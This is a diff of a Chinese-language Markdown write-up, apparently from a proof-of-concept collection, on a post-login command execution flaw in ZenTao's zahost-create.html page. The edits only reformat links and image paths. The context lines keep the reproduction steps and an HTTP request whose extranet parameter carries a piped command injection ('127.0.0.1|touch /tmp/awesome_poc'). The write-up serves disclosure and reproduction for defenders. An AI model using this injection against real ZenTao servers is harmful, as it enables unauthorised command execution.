@@ -6,8 +6,8 @@
 
 参考链接：
 
-- https://www.zentao.net/book/zentaoprohelp/41.html
-- https://www.zentao.net/book/zentaopms/405.html
+* https://www.zentao.net/book/zentaoprohelp/41.html
+* https://www.zentao.net/book/zentaopms/405.html
 
 ## 漏洞影响
 
@@ -43,9 +43,9 @@ services:
 
 使用安装时配置的账号密码登录系统，点击 `测试 → 宿主机`，添加一个宿主机：
 
-![](images/禅道%20zahost-create.html%20后台命令执行漏洞/image-20250407113416776.png)
+![](../.gitbook/assets/image-20250407113416776.png)
 
-![](images/禅道%20zahost-create.html%20后台命令执行漏洞/image-20250407113543730.png)
+![](../.gitbook/assets/image-20250407113543730.png)
 
 抓包，修改 extranet 参数，拼接命令，执行 `touch /tmp/awesome_poc`：
 
@@ -66,9 +66,9 @@ Content-Length: 120
 vsoft=kvm&hostType=physical&name=poc&extranet=127.0.0.1|touch%20/tmp/awesome_poc&cpuCores=2&memory=2&diskSize=20&desc=&uid=67f347db724c1&type=za
 ```
 
-![](images/禅道%20zahost-create.html%20后台命令执行漏洞/image-20250407114109214.png)
+![](../.gitbook/assets/image-20250407114109214.png)
 
-![](images/禅道%20zahost-create.html%20后台命令执行漏洞/image-20250407114454097.png)
+![](../.gitbook/assets/image-20250407114454097.png)
 
 ## 漏洞修复
 
